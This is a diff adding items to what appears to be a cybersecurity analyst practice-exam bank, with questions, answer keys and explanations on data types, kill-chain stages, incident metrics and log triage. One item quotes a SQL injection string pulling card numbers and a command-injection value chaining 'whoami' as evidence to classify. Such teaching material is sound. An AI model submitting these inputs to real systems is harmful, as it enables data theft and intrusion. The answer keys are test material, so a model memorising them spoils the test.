+    [
+     "Only PII, with no extra protection",
+     "Health details tied to a person make it PHI."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-27",
+   "d": "5.0",
+   "obj": "5.9",
+   "q": "A company's unreleased product designs and source code are stolen. What type of protected data was lost?",
+   "o": [
+    [
+     "Intellectual property",
+     "Right. Designs, code and trade secrets are IP."
+    ],
+    [
+     "PHI",
+     "There's no health data."
+    ],
+    [
+     "PII",
+     "There's no personal data."
+    ],
+    [
+     "Payment card data",
+     "No card numbers are involved."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-28",
+   "d": "5.0",
+   "obj": "5.9",
+   "q": "Which item is PII on its own?",
+   "o": [
+    [
+     "A full name with an SSN",
+     "Right. Together they identify a specific person."
+    ],
+    [
+     "The company's quarterly revenue",
+     "That's business data, not personal."
+    ],
+    [
+     "A server's fully qualified host name",
+     "Host names identify machines."
+    ],
+    [
+     "A firewall rule",
+     "Rules are configuration."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-29",
+   "d": "5.0",
+   "obj": "5.10",
+   "q": "An employee receives an email with a malicious Word file attached. Which Cyber Kill Chain stage is this?",
+   "o": [
+    [
+     "Delivery",
+     "Right. Delivery is the weapon reaching the target, here by email."
+    ],
+    [
+     "Weaponization",
+     "Weaponization is building the file before it's sent."
+    ],
+    [
+     "Exploitation",
+     "Exploitation is when the code runs on the target."
+    ],
+    [
+     "Installation",
+     "Installation is putting persistent malware on the host."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-30",
+   "d": "5.0",
+   "obj": "5.10",
+   "q": "In the Diamond Model, a C2 domain the attacker registered belongs to which vertex?",
+   "o": [
+    [
+     "Infrastructure",
+     "Right. Domains, IPs and servers the attacker uses are infrastructure."
+    ],
+    [
+     "Capability",
+     "Capability is the malware or technique."
+    ],
+    [
+     "Adversary",
+     "The adversary is the attacker."
+    ],
+    [
+     "Victim",
+     "The victim is the target."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-31",
+   "d": "5.0",
+   "obj": "5.10",
+   "q": "After the macro runs, malware adds a service so it starts on every boot. Which kill chain stage is this?",
+   "o": [
+    [
+     "Installation",
+     "Right. Setting up persistence on the host is installation."
+    ],
+    [
+     "Delivery",
+     "Delivery already happened when the file arrived."
+    ],
+    [
+     "Command and control",
+     "C2 is when the malware talks back to the attacker."
+    ],
+    [
+     "Reconnaissance",
+     "Recon is research before the attack."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-32",
+   "d": "5.0",
+   "obj": "5.11",
+   "q": "An attacker got in on March 1. The SOC spotted it on March 20. Which metric is 19 days?",
+   "o": [
+    [
+     "Time to detect",
+     "Right. It measures from compromise to detection."
+    ],
+    [
+     "Time to contain",
+     "Containment comes after detection."
+    ],
+    [
+     "Time to respond",
+     "Responding starts after detection."
+    ],
+    [
+     "Time to control",
+     "Control is reached after response actions."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-33",
+   "d": "5.0",
+   "obj": "5.11",
+   "q": "Why does a long time to detect usually mean a bigger investigation scope?",
+   "o": [
+    [
+     "The attacker had longer to spread",
+     "Right. Each extra day can add systems and records to check."
+    ],
+    [
+     "Logs grow smaller over time",
+     "Logs grow larger."
+    ],
+    [
+     "Longer detection always means the attacker is weaker",
+     "It often means a stealthier one."
+    ],
+    [
+     "It shrinks the number of affected systems",
+     "It usually grows it."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-34",
+   "d": "5.0",
+   "obj": "5.11",
+   "q": "Detection happened at 09:00. The infected hosts were cut off from the network at 13:30. Which metric is 4.5 hours?",
+   "o": [
+    [
+     "Time to contain",
+     "Right. It measures from detection to stopping the spread."
+    ],
+    [
+     "Time to detect",
+     "That runs from compromise to detection."
+    ],
+    [
+     "Mean time between failures",
+     "That's a reliability metric."
+    ],
+    [
+     "Recovery point objective",
+     "RPO is about acceptable data loss."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "kind": "table",
+   "d": "4.0",
+   "obj": "4.1",
+   "title": "Match the log to its source",
+   "short": "Log sources",
+   "scenario": "Five log lines from one investigation. Pick the technology that most likely wrote each one.",
+   "cols": [
+    "Source"
+   ],
+   "opts": [
+    [
+     "IDS/IPS",
+     "Firewall",
+     "Web proxy",
+     "NetFlow",
+     "Antivirus"
+    ]
+   ],
+   "rows": [
+    {
+     "req": "[1:2027865:2] ET MALWARE Cobalt Strike beacon, 10.4.2.9 -> 198.51.100.40:443",
+     "a": [
+      0
+     ],
+     "why": "A signature ID and rule name come from an IDS/IPS."
+    },
+    {
+     "req": "DENY tcp 203.0.113.66:51034 -> 10.0.0.15:3389 by access-group OUTSIDE_IN",
+     "a": [
+      1
+     ],
+     "why": "An access rule denying a connection is a firewall log."
+    },
+    {
+     "req": "user=mlopez GET hxxp://update-check[.]example/a.exe category=Uncategorized action=allow",
+     "a": [
+      2
+     ],
+     "why": "User, URL and category come from a web proxy."
+    },
+    {
+     "req": "10.4.2.9 > 198.51.100.40 TCP 443, 3,402 pkts, 4.1 MB, 6 hr 12 min",
+     "a": [
+      3
+     ],
+     "why": "Addresses, counts and duration with no payload is a flow record."
+    },
+    {
+     "req": "Trojan.GenericKD quarantined: C:\\Users\\mlopez\\Downloads\\a.exe",
+     "a": [
+      4
+     ],
+     "why": "A detection name and a file quarantine come from antivirus."
+    }
+   ],
+   "t": "pbq",
+   "id": "cb-p-01",
+   "dom": "4.0"
+  },
+  {
+   "kind": "match",
+   "d": "4.0",
+   "obj": "4.2",
+   "title": "Classify the alert outcome",
+   "short": "Alert outcomes",
+   "scenario": "Four results after triage. Pick the outcome for each one. Two options are distractors.",
+   "choices": [
+    "True positive",
+    "False positive",
+    "False negative",
+    "True negative",
+    "Benign",
+    "Escalated"
+   ],
+   "pick": "Outcome",
+   "items": [
+    {
+     "text": "An IDS alert on a SQL injection proves real; the attacker pulled data.",
+     "a": 0,
+     "why": "A real attack with an alert is a true positive."
+    },
+    {
+     "text": "An alert fires on a payroll export that turns out to be normal work.",
+     "a": 1,
+     "why": "An alert on harmless traffic it misread is a false positive."
+    },
+    {
+     "text": "Weeks later, a breach is found that no tool ever alerted on.",
+     "a": 2,
+     "why": "A real attack with no alert is a false negative."
+    },
+    {
+     "text": "The red team's approved scan triggers an accurate scan alert.",
+     "a": 4,
+     "why": "The alert is accurate, but the activity is approved and harmless."
+    }
+   ],
+   "t": "pbq",
+   "id": "cb-p-02",
+   "dom": "4.0"
+  },
+  {
+   "kind": "table",
+   "d": "5.0",
+   "obj": "5.4",
+   "title": "Pick the NIST SP 800-61 phase",
+   "short": "IR phases",
+   "scenario": "Five incident tasks. Pick the NIST SP 800-61 phase each one belongs to.",
+   "cols": [
+    "Phase"
+   ],
+   "opts": [
+    [
+     "Preparation",
+     "Detection and analysis",
+     "Containment, eradication and recovery",
+     "Post-incident activity"
+    ]
+   ],
+   "rows": [
+    {
+     "req": "Run a tabletop exercise and update the call list.",
+     "a": [
+      0
+     ],
+     "why": "Training and contact lists are set up before incidents."
+    },
+    {
+     "req": "Check an IDS alert against host logs to confirm it's real.",
+     "a": [
+      1
+     ],
+     "why": "Confirming and scoping an alert is analysis."
+    },
+    {
+     "req": "Disable the stolen account and block the C2 domain.",
+     "a": [
+      2
+     ],
+     "why": "Cutting off the attacker is containment."
+    },
+    {
+     "req": "Rebuild the infected server from a clean image.",
+     "a": [
+      2
+     ],
+     "why": "Rebuilding is eradication and recovery."
+    },
+    {
+     "req": "Hold a lessons-learned meeting and update the playbook.",
+     "a": [
+      3
+     ],
+     "why": "Reviews and improvements come after."
+    }
+   ],
+   "t": "pbq",
+   "id": "cb-p-03",
+   "dom": "5.0"
+  },
+  {
+   "kind": "match",
+   "d": "5.0",
+   "obj": "5.10",
+   "title": "Map the Cyber Kill Chain",
+   "short": "Kill chain",
+   "scenario": "Four steps from one intrusion. Pick the Cyber Kill Chain stage for each. Two options are distractors.",
+   "choices": [
+    "Reconnaissance",
+    "Weaponization",
+    "Exploitation",
+    "Command and control",
+    "Diamond Model",
+    "Containment"
+   ],
+   "pick": "Stage",
+   "items": [
+    {
+     "text": "The attacker studies staff profiles on LinkedIn.",
+     "a": 0,
+     "why": "Researching the target is reconnaissance."
+    },
+    {
+     "text": "The attacker builds a Word file with a malicious macro.",
+     "a": 1,
+     "why": "Building the weapon before sending it is weaponization."
+    },
+    {
+     "text": "The victim enables macros and the exploit code runs.",
+     "a": 2,
+     "why": "Code running on the target is exploitation."
+    },
+    {
+     "text": "The implant checks in with an outside server every minute.",
+     "a": 3,
+     "why": "Talking back to the attacker is command and control."
+    }
+   ],
+   "t": "pbq",
+   "id": "cb-p-04",
+   "dom": "5.0"
+  },
+  {
+   "kind": "table",
+   "d": "2.0",
+   "obj": "2.4",
+   "title": "Name the monitoring data type",
+   "short": "Data types",
+   "scenario": "Five pieces of data in a SOC. Pick the data type each one is.",
+   "cols": [
+    "Type"
+   ],
+   "opts": [
+    [
+     "Full packet capture",
+     "Session data",
+     "Transaction data",
+     "Statistical data",
+     "Alert data"
+    ]
+   ],
+   "rows": [
+    {
+     "req": "A PCAP with every byte of a suspicious SMB transfer.",
+     "a": [
+      0
+     ],
+     "why": "Every byte, payload included, is a full capture."
+    },
+    {
+     "req": "Host A talked to host B on TCP 22 for 40 minutes and sent 2 MB.",
+     "a": [
+      1
+     ],
+     "why": "A summary of one whole conversation is session data."
+    },
+    {
+     "req": "DNS log: query evil.example A, answer 203.0.113.9.",
+     "a": [
+      2
+     ],
+     "why": "One request paired with its response is transaction data."
+    },
+    {
+     "req": "The HR subnet averages 30 Mbps at noon on weekdays.",
+     "a": [
+      3
+     ],
+     "why": "Averages over time are statistical data."
+    },
+    {
+     "req": "IPS: possible SQL injection, severity high.",
+     "a": [
+      4
+     ],
+     "why": "A rule firing produces alert data."
+    }
+   ],
+   "t": "pbq",
+   "id": "cb-p-05",
+   "dom": "2.0"
+  },
+  {
+   "kind": "match",
+   "d": "2.0",
+   "obj": "2.6",
+   "title": "Name the attack from the evidence",
+   "short": "Attack evidence",
+   "scenario": "Four pieces of evidence. Pick the attack each one shows. Two options are distractors.",
+   "choices": [
+    "SQL injection",
+    "Stored XSS",
+    "Command injection",
+    "SYN flood",
+    "Whaling",
+    "Port scan"
+   ],
+   "pick": "Attack",
+   "items": [
+    {
+     "text": "Search box input: ' UNION SELECT card_no FROM payments--",
+     "a": 0,
+     "why": "A UNION SELECT in input targets the database."
+    },
+    {
+     "text": "A forum post with a script tag runs in every reader's browser.",
+     "a": 1,
+     "why": "Saved script that runs for each visitor is stored XSS."
+    },
+    {
+     "text": "Ping tool input: 10.0.0.1 && whoami",
+     "a": 2,
+     "why": "&& chains an extra OS command."
+    },
+    {
+     "text": "Thousands of SYNs from spoofed IPs, no ACKs, full backlog.",
+     "a": 3,
+     "why": "Unfinished handshakes that use up resources are a SYN flood."
+    }
+   ],
+   "t": "pbq",
+   "id": "cb-p-06",
+   "dom": "2.0"
+  }
+ ]
+}
